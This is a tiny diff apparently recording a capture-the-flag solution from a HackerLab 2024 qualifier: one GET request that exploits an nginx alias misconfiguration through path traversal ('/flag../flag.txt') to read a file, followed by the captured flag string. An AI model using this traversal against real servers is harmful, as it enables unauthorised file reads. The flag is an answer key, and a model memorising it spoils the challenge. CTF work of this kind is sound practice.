@@ -1,0 +1,4 @@
+method: GET http://qualif.hackerlab.bj:3050/flag../flag.txt  (nginx alias vulnerability)
+
+
+HLB2024{hunt1G_&ND_F1nD_V8ln_In_w3B_App}
